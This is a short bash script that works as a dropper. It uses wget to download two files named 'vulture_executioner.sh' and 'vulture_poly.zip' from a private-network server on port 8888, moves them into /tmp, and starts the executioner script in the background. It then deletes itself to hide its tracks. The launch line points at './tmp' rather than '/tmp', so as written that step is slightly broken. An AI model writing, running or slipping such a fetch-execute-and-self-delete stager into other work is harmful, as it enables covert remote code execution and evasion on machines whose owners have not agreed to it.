#!/bin/bash

wget http://192.168.1.126:8888/tools/vulture_executioner.sh
wget http://192.168.1.126:8888/tools/archives/vulture_poly.zip
mv vulture_* /tmp
sleep 3
./tmp/vulture_executioner.sh &
rm -- "$0"
